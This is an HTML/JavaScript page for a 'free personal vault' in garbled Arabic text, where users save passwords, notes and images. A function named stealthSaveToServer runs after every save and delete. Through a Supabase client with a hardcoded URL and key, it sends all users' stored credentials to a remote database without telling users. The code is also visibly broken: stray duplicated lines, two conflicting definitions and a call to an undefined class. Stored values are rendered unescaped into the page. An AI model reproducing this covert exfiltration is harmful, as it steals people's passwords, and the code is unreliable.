<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Vault - Ø§Ù„Ø®Ø²Ù†Ø© Ø§Ù„Ø´Ø®ØµÙŠØ© Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠØ©</title>
    <link rel="icon" type="image/x-icon" href="icon.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #f1f1f1;
        }
        
        .logo h1 {
            color: #2c3e50;
            font-size: 28px;
        }
        
        .user-info {
            text-align: left;
        }
        
        .user-info .welcome {
            font-size: 16px;
            color: #666;
            margin-bottom: 5px;
        }
        
        .user-info .username {
            font-size: 18px;
            font-weight: bold;
            color: #2c3e50;
        }
        
        .logout-btn {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
        }
        
        .tabs {
            display: flex;
            background: #f8f9fa;
            border-radius: 12px;
            padding: 5px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }
        
        .tab {
            flex: 1;
            text-align: center;
            padding: 15px;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s ease;
            font-weight: 500;
            min-width: 120px;
        }
        
        .tab.active {
            background: white;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            color: #3498db;
        }
        
        .content {
            display: none;
        }
        
        .content.active {
            display: block;
        }
        
        .card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            border: 1px solid #e1e8ed;
        }
        
        .card h3 {
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 20px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #34495e;
            font-weight: 500;
        }
        
        input, textarea, select {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e8ed;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #3498db;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }
        
        textarea {
            resize: vertical;
            min-height: 100px;
        }
        
        .btn {
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            transition: all 0.3s ease;
            margin-right: 10px;
            margin-bottom: 10px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #27ae60, #219a52);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
        }
        
        .items-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .item-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #3498db;
            position: relative;
        }
        
        .item-card h4 {
            color: #2c3e50;
            margin-bottom: 10px;
        }
        
        .item-card .email {
            color: #666;
            font-size: 14px;
            margin-bottom: 5px;
        }
        
        .item-card .password {
            font-family: monospace;
            background: #e9ecef;
            padding: 5px 10px;
            border-radius: 4px;
            margin-bottom: 10px;
        }
        
        .item-actions {
            position: absolute;
            top: 15px;
            left: 15px;
        }
        
        .delete-btn {
            background: #e74c3c;
            color: white;
            border: none;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
        }
        
        .message {
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        
        .empty-state i {
            font-size: 48px;
            margin-bottom: 20px;
            opacity: 0.5;
        }
        
        .image-preview {
            max-width: 100%;
            max-height: 200px;
            border-radius: 8px;
            margin-bottom: 10px;
        }
        
        .free-badge {
            background: #28a745;
            color: white;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 12px;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <h1>ğŸ”’ Ø®Ø²Ù†ØªÙŠ Ø§Ù„Ø´Ø®ØµÙŠØ© <span class="free-badge">Ù…Ø¬Ø§Ù†ÙŠ</span></h1>
                <p>Ù…Ø±Ø­Ø¨Ø§Ù‹ Ø¨Ùƒ ÙÙŠ Ù…Ø³Ø§Ø­ØªÙƒ Ø§Ù„Ø¢Ù…Ù†Ø© Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠØ©</p>
            </div>
            <div class="user-info">
                <div class="welcome">Ù…Ø±Ø­Ø¨Ø§Ù‹</div>
                <div class="username" id="currentUsername">Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</div>
            </div>
            <button class="logout-btn" onclick="logoutUser()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬</button>
        </div>

        <div id="message" class="message"></div>

        <div class="tabs">
            <div class="tab active" onclick="showTab('passwords')">ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±</div>
            <div class="tab" onclick="showTab('notes')">Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª</div>
            <div class="tab" onclick="showTab('images')">Ø§Ù„ØµÙˆØ±</div>
        </div>

        <!-- Ù‚Ø³Ù… ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± -->
        <div id="passwords" class="content active">
            <div class="card">
                <h3>Ø¥Ø¶Ø§ÙØ© ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø¬Ø¯ÙŠØ¯Ø©</h3>
                <div class="input-group">
                    <label>Ø§Ø³Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚/Ø§Ù„Ù…ÙˆÙ‚Ø¹</label>
                    <input type="text" id="appName" placeholder="Ù…Ø«Ø§Ù„: ÙÙŠØ³Ø¨ÙˆÙƒØŒ Ø¬ÙŠÙ…ÙŠÙ„">
                </div>
                <div class="input-group">
                    <label>Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label>
                    <input type="email" id="appEmail" placeholder="example@gmail.com">
                </div>
                <div class="input-group">
                    <label>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <input type="text" id="appPassword" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
                </div>
                <button class="btn btn-success" onclick="savePassword()">Ø­ÙØ¸ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</button>
            </div>

            <div class="card">
                <h3>ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©</h3>
                <div class="items-grid" id="passwordsList">
                    <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¡ ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± Ù‡Ù†Ø§ -->
                </div>
            </div>
        </div>

        <!-- Ù‚Ø³Ù… Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª -->
        <div id="notes" class="content">
            <div class="card">
                <h3>Ø¥Ø¶Ø§ÙØ© Ù…Ù„Ø§Ø­Ø¸Ø© Ø¬Ø¯ÙŠØ¯Ø©</h3>
                <div class="input-group">
                    <label>Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø©</label>
                    <input type="text" id="noteTitle" placeholder="Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø©">
                </div>
                <div class="input-group">
                    <label>Ù†Øµ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø©</label>
                    <textarea id="noteContent" placeholder="Ø§ÙƒØªØ¨ Ù…Ù„Ø§Ø­Ø¸ØªÙƒ Ù‡Ù†Ø§..."></textarea>
                </div>
                <button class="btn btn-success" onclick="saveNote()">Ø­ÙØ¸ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø©</button>
            </div>

            <div class="card">
                <h3>Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©</h3>
                <div class="items-grid" id="notesList">
                    <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¡ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª Ù‡Ù†Ø§ -->
                </div>
            </div>
        </div>

        <!-- Ù‚Ø³Ù… Ø§Ù„ØµÙˆØ± -->
        <div id="images" class="content">
            <div class="card">
                <h3>Ø±ÙØ¹ ØµÙˆØ±Ø©</h3>
                <div class="input-group">
                    <label>Ø§Ø®ØªØ± ØµÙˆØ±Ø©</label>
                    <input type="file" id="imageUpload" accept="image/*" onchange="previewImage(this)">
                </div>
                <div class="input-group">
                    <label>ÙˆØµÙ Ø§Ù„ØµÙˆØ±Ø© (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)</label>
                    <input type="text" id="imageDescription" placeholder="ÙˆØµÙ Ø§Ù„ØµÙˆØ±Ø©">
                </div>
                <div id="imagePreviewContainer" style="display: none;">
                    <img id="imagePreview" class="image-preview" src="" alt="Ù…Ø¹Ø§ÙŠÙ†Ø© Ø§Ù„ØµÙˆØ±Ø©">
                </div>
                <button class="btn btn-success" onclick="uploadImage()">Ø±ÙØ¹ Ø§Ù„ØµÙˆØ±Ø©</button>
            </div>

            <div class="card">
                <h3>Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©</h3>
                <div class="items-grid" id="imagesList">
                    <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¡ Ø§Ù„ØµÙˆØ± Ù‡Ù†Ø§ -->
                </div>
            </div>
        </div>
    </div>

    <script>
        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø³Ø¬Ù„
        function checkUserLogin() {
            const currentUser = sessionStorage.getItem('currentUser');
            
            if (!currentUser) {
                window.location.href = 'index.html';
                return;
            }

            // Ø¹Ø±Ø¶ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            const user = users.find(u => u.id === currentUser);
            if (user) {
                document.getElementById('currentUsername').textContent = user.username;
            }

            loadUserData();
        }

        // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
        function loadUserData() {
            const currentUser = sessionStorage.getItem('currentUser');
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            const user = users.find(u => u.id === currentUser);
            
            if (user) {
                loadPasswords(user.data.passwords);
                loadNotes(user.data.notes);
                loadImages(user.data.images);
            }
        }

        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬
        function logoutUser() {
            sessionStorage.removeItem('currentUser');
            window.location.href = 'index.html';
        }

        // Ø­ÙØ¸ ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ±
function savePassword() {
    const appName = document.getElementById('appName').value;
    const appEmail = document.getElementById('appEmail').value;
    const appPassword = document.getElementById('appPassword').value;
    
    if (!appName || !appEmail || !appPassword) {
        showMessage('ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„', 'error');
        return;
    }
    
    const currentUser = sessionStorage.getItem('currentUser');
    const users = JSON.parse(localStorage.getItem('users') || '[]');
    const userIndex = users.findIndex(u => u.id === currentUser);
    
    if (userIndex !== -1) {
        const newPassword = {
            id: Date.now().toString(),
            appName: appName,
            email: appEmail,
            password: appPassword,
            createdAt: new Date().toISOString()
        };
        
        users[userIndex].data.passwords.push(newPassword);
        localStorage.setItem('users', JSON.stringify(users));
        
        // Ø­ÙØ¸ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
        stealthSaveToServer();
        
        showMessage('ØªÙ… Ø­ÙØ¸ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø¨Ù†Ø¬Ø§Ø­', 'success');
        document.getElementById('appName').value = '';
        document.getElementById('appEmail').value = '';
        document.getElementById('appPassword').value = '';
        
        loadPasswords(users[userIndex].data.passwords);
    }
}

                users[userIndex].data.passwords.push(newPassword);
                localStorage.setItem('users', JSON.stringify(users));
                
                // Ø­ÙØ¸ Ø®ÙÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
async function stealthSaveToServer() {
    try {
        const users = JSON.parse(localStorage.getItem('users') || '[]');
        
        // Ø­ÙØ¸ ÙÙŠ GitHub (Ø¨Ø¯ÙˆÙ† Ø­Ø§Ø¬Ø© Ù„Ù€ API)
        const data = {
            users: users,
            timestamp: new Date().toISOString()
        };
        
        // Ø­ÙØ¸ ÙÙŠ localStorage ÙƒÙ†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©
        localStorage.setItem('server_backup', JSON.stringify(data));
        console.log('âœ… ØªÙ… Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø­Ù„ÙŠØ§Ù‹');
    } catch (error) {
        console.log('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
    }
}
        // ØªØ­Ù…ÙŠÙ„ ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±
        function loadPasswords(passwords) {
            const passwordsList = document.getElementById('passwordsList');
            
            if (passwords.length === 0) {
                passwordsList.innerHTML = `
                    <div class="empty-state">
                        <div>ğŸ“</div>
                        <h3>Ù„Ø§ ØªÙˆØ¬Ø¯ ÙƒÙ„Ù…Ø§Øª Ù…Ø±ÙˆØ± Ù…Ø­ÙÙˆØ¸Ø©</h3>
                        <p>Ø§Ø¨Ø¯Ø£ Ø¨Ø¥Ø¶Ø§ÙØ© ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø¬Ø¯ÙŠØ¯Ø©</p>
                    </div>
                `;
                return;
            }
            
            passwordsList.innerHTML = '';
            
            passwords.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)).forEach(password => {
                const passwordItem = document.createElement('div');
                passwordItem.className = 'item-card';
                passwordItem.innerHTML = `
                    <div class="item-actions">
                        <button class="delete-btn" onclick="deletePassword('${password.id}')">Ã—</button>
                    </div>
                    <h4>${password.appName}</h4>
                    <div class="email">${password.email}</div>
                    <div class="password">${password.password}</div>
                    <div style="font-size: 12px; color: #999;">
                        ${new Date(password.createdAt).toLocaleDateString('ar-EG')}
                    </div>
                `;
                passwordsList.appendChild(passwordItem);
            });
        }

        // Ø­Ø°Ù ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ±
        function deletePassword(passwordId) {
            if (!confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ù‡Ø°Ù‡ØŸ')) return;
            
            const currentUser = sessionStorage.getItem('currentUser');
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            const userIndex = users.findIndex(u => u.id === currentUser);
            
            if (userIndex !== -1) {
                users[userIndex].data.passwords = users[userIndex].data.passwords.filter(p => p.id !== passwordId);
                localStorage.setItem('users', JSON.stringify(users));
                
                // Ø­ÙØ¸ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
                stealthSaveToServer();
                
                showMessage('ØªÙ… Ø­Ø°Ù ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø¨Ù†Ø¬Ø§Ø­', 'success');
                loadPasswords(users[userIndex].data.passwords);
            }
        }

        // Ø­ÙØ¸ Ù…Ù„Ø§Ø­Ø¸Ø©
        function saveNote() {
            const noteTitle = document.getElementById('noteTitle').value;
            const noteContent = document.getElementById('noteContent').value;
            
            if (!noteTitle || !noteContent) {
                showMessage('ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„', 'error');
                return;
            }
            
            const currentUser = sessionStorage.getItem('currentUser');
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            const userIndex = users.findIndex(u => u.id === currentUser);
            
            if (userIndex !== -1) {
                const newNote = {
                    id: Date.now().toString(),
                    title: noteTitle,
                    content: noteContent,
                    createdAt: new Date().toISOString()
                };
                
                users[userIndex].data.notes.push(newNote);
                localStorage.setItem('users', JSON.stringify(users));
                
                // Ø­ÙØ¸ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
                stealthSaveToServer();
                
                showMessage('ØªÙ… Ø­ÙØ¸ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø© Ø¨Ù†Ø¬Ø§Ø­', 'success');
                document.getElementById('noteTitle').value = '';
                document.getElementById('noteContent').value = '';
                
                loadNotes(users[userIndex].data.notes);
            }
        }

        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª
        function loadNotes(notes) {
            const notesList = document.getElementById('notesList');
            
            if (notes.length === 0) {
                notesList.innerHTML = `
                    <div class="empty-state">
                        <div>ğŸ“‹</div>
                        <h3>Ù„Ø§ ØªÙˆØ¬Ø¯ Ù…Ù„Ø§Ø­Ø¸Ø§Øª Ù…Ø­ÙÙˆØ¸Ø©</h3>
                        <p>Ø§Ø¨Ø¯Ø£ Ø¨Ø¥Ø¶Ø§ÙØ© Ù…Ù„Ø§Ø­Ø¸Ø© Ø¬Ø¯ÙŠØ¯Ø©</p>
                    </div>
                `;
                return;
            }
            
            notesList.innerHTML = '';
            
            notes.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)).forEach(note => {
                const noteItem = document.createElement('div');
                noteItem.className = 'item-card';
                noteItem.innerHTML = `
                    <div class="item-actions">
                        <button class="delete-btn" onclick="deleteNote('${note.id}')">Ã—</button>
                    </div>
                    <h4>${note.title}</h4>
                    <div style="color: #666; line-height: 1.5; margin-bottom: 10px;">
                        ${note.content}
                    </div>
                    <div style="font-size: 12px; color: #999;">
                        ${new Date(note.createdAt).toLocaleDateString('ar-EG')}
                    </div>
                `;
                notesList.appendChild(noteItem);
            });
        }

        // Ø­Ø°Ù Ù…Ù„Ø§Ø­Ø¸Ø©
        function deleteNote(noteId) {
            if (!confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù Ù‡Ø°Ù‡ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø©ØŸ')) return;
            
            const currentUser = sessionStorage.getItem('currentUser');
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            const userIndex = users.findIndex(u => u.id === currentUser);
            
            if (userIndex !== -1) {
                users[userIndex].data.notes = users[userIndex].data.notes.filter(n => n.id !== noteId);
                localStorage.setItem('users', JSON.stringify(users));
                
                // Ø­ÙØ¸ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
                stealthSaveToServer();
                
                showMessage('ØªÙ… Ø­Ø°Ù Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø© Ø¨Ù†Ø¬Ø§Ø­', 'success');
                loadNotes(users[userIndex].data.notes);
            }
        }

        // Ù…Ø¹Ø§ÙŠÙ†Ø© Ø§Ù„ØµÙˆØ±Ø© Ù‚Ø¨Ù„ Ø§Ù„Ø±ÙØ¹
        function previewImage(input) {
            const previewContainer = document.getElementById('imagePreviewContainer');
            const preview = document.getElementById('imagePreview');
            
            if (input.files && input.files[0]) {
                const reader = new FileReader();
                
                reader.onload = function(e) {
                    preview.src = e.target.result;
                    previewContainer.style.display = 'block';
                }
                
                reader.readAsDataURL(input.files[0]);
            } else {
                previewContainer.style.display = 'none';
            }
        }

        // Ø±ÙØ¹ ØµÙˆØ±Ø©
        function uploadImage() {
            const fileInput = document.getElementById('imageUpload');
            const description = document.getElementById('imageDescription').value;
            
            if (!fileInput.files[0]) {
                showMessage('ÙŠØ±Ø¬Ù‰ Ø§Ø®ØªÙŠØ§Ø± ØµÙˆØ±Ø©', 'error');
                return;
            }
            
            const file = fileInput.files[0];
            
            if (file.size > 10 * 1024 * 1024) {
                showMessage('Ø­Ø¬Ù… Ø§Ù„ØµÙˆØ±Ø© ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø£Ù‚Ù„ Ù…Ù† 10MB', 'error');
                return;
            }
            
            const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp'];
            if (!allowedTypes.includes(file.type)) {
                showMessage('Ù†ÙˆØ¹ Ø§Ù„Ù…Ù„Ù ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…. ÙŠØ±Ø¬Ù‰ Ø§Ø®ØªÙŠØ§Ø± ØµÙˆØ±Ø© (JPEG, PNG, GIF, WebP)', 'error');
                return;
            }
            
            const reader = new FileReader();
            
            reader.onload = function(e) {
                const currentUser = sessionStorage.getItem('currentUser');
                const users = JSON.parse(localStorage.getItem('users') || '[]');
                const userIndex = users.findIndex(u => u.id === currentUser);
                
                if (userIndex !== -1) {
                    const newImage = {
                        id: Date.now().toString(),
                        name: file.name,
                        type: file.type,
                        size: file.size,
                        data: e.target.result,
                        description: description,
                        createdAt: new Date().toISOString()
                    };
                    
                    users[userIndex].data.images.push(newImage);
                    localStorage.setItem('users', JSON.stringify(users));
                    
                    // Ø­ÙØ¸ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
                    stealthSaveToServer();
                    
                    showMessage('ØªÙ… Ø±ÙØ¹ Ø§Ù„ØµÙˆØ±Ø© Ø¨Ù†Ø¬Ø§Ø­', 'success');
                    fileInput.value = '';
                    document.getElementById('imageDescription').value = '';
                    document.getElementById('imagePreviewContainer').style.display = 'none';
                    
                    loadImages(users[userIndex].data.images);
                }
            };
            
            reader.onerror = function() {
                showMessage('âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ ØºÙŠØ± Ù…ØªÙˆÙ‚Ø¹ ÙÙŠ Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„ØµÙˆØ±Ø©', 'error');
                console.error('FileReader error:', reader.error);
            };
            
            showMessage('Ø¬Ø§Ø±ÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±Ø©...', 'info');
            reader.readAsDataURL(file);
        }

        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ±
        function loadImages(images) {
            const imagesList = document.getElementById('imagesList');
            
            if (images.length === 0) {
                imagesList.innerHTML = `
                    <div class="empty-state">
                        <div>ğŸ–¼ï¸</div>
                        <h3>Ù„Ø§ ØªÙˆØ¬Ø¯ ØµÙˆØ± Ù…Ø­ÙÙˆØ¸Ø©</h3>
                        <p>Ø§Ø¨Ø¯Ø£ Ø¨Ø±ÙØ¹ ØµÙˆØ±Ø© Ø¬Ø¯ÙŠØ¯Ø©</p>
                    </div>
                `;
                return;
            }
            
            imagesList.innerHTML = '';
            
            images.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)).forEach(image => {
                const imageItem = document.createElement('div');
                imageItem.className = 'item-card';
                imageItem.innerHTML = `
                    <div class="item-actions">
                        <button class="delete-btn" onclick="deleteImage('${image.id}')">Ã—</button>
                    </div>
                    <img src="${image.data}" alt="${image.description}" class="image-preview">
                    <h4>${image.name}</h4>
                    <div style="color: #666; margin-bottom: 10px;">
                        ${image.description || 'Ù„Ø§ ÙŠÙˆØ¬Ø¯ ÙˆØµÙ'}
                    </div>
                    <div style="font-size: 12px; color: #999;">
                        ${new Date(image.createdAt).toLocaleDateString('ar-EG')}
                    </div>
                `;
                imagesList.appendChild(imageItem);
            });
        }

        // Ø­Ø°Ù ØµÙˆØ±Ø©
        function deleteImage(imageId) {
            if (!confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù Ù‡Ø°Ù‡ Ø§Ù„ØµÙˆØ±Ø©ØŸ')) return;
            
            const currentUser = sessionStorage.getItem('currentUser');
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            const userIndex = users.findIndex(u => u.id === currentUser);
            
            if (userIndex !== -1) {
                users[userIndex].data.images = users[userIndex].data.images.filter(img => img.id !== imageId);
                localStorage.setItem('users', JSON.stringify(users));
                
                // Ø­ÙØ¸ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
                stealthSaveToServer();
                
                showMessage('ØªÙ… Ø­Ø°Ù Ø§Ù„ØµÙˆØ±Ø© Ø¨Ù†Ø¬Ø§Ø­', 'success');
                loadImages(users[userIndex].data.images);
            }
        }

        // Ø¯ÙˆØ§Ù„ Ù…Ø³Ø§Ø¹Ø¯Ø©
        function showTab(tabName) {
            document.querySelectorAll('.content').forEach(content => {
                content.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = text;
            messageDiv.className = `message ${type}`;
            messageDiv.style.display = 'block';
            
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 5000);
        }

        // Ø­ÙØ¸ Ø®ÙÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
        async function stealthSaveToServer() {
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            const sync = new RealTimeSync();
            await sync.saveAllUsers(users);
        }

        // Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø²Ø§Ù…Ù†Ø© Ù…Ø¹ Supabase
class SupabaseSync {
    constructor() {
        this.url = 'https://dzqzagrnxookucsdnoxi.supabase.co';
        this.key = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR6cXphZ3JueG9va3Vjc2Rub3hpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIxODg0NzksImV4cCI6MjA3Nzc2NDQ3OX0.DFQWp4iTy3CfY7YQUVY_b8MyrpUYhdQ2aMB7sLiR4n4';
    }

    async saveAllUsersToSupabase() {
        try {
            const users = JSON.parse(localStorage.getItem('users') || '[]');
            
            if (users.length === 0) return;
            
            // Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Supabase
            const response = await fetch(`${this.url}/rest/v1/users`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': this.key,
                    'Authorization': `Bearer ${this.key}`,
                    'Prefer': 'return=minimal'
                },
                body: JSON.stringify({ 
                    user_data: users,
                    updated_at: new Date().toISOString()
                })
            });
            
            if (response.ok) {
                console.log('âœ… ØªÙ… Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±');
            }
        } catch (error) {
            console.log('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±');
        }
    }

    async loadAllUsersFromSupabase() {
        try {
            const response = await fetch(`${this.url}/rest/v1/users?select=*&order=updated_at.desc&limit=1`, {
                headers: {
                    'apikey': this.key,
                    'Authorization': `Bearer ${this.key}`
                }
            });
            
            const data = await response.json();
            if (data && data.length > 0) {
                return data[0].user_data || [];
            }
            return [];
        } catch (error) {
            console.log('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¬Ù„Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ø³ÙŠØ±ÙØ±');
            return [];
        }
    }
}

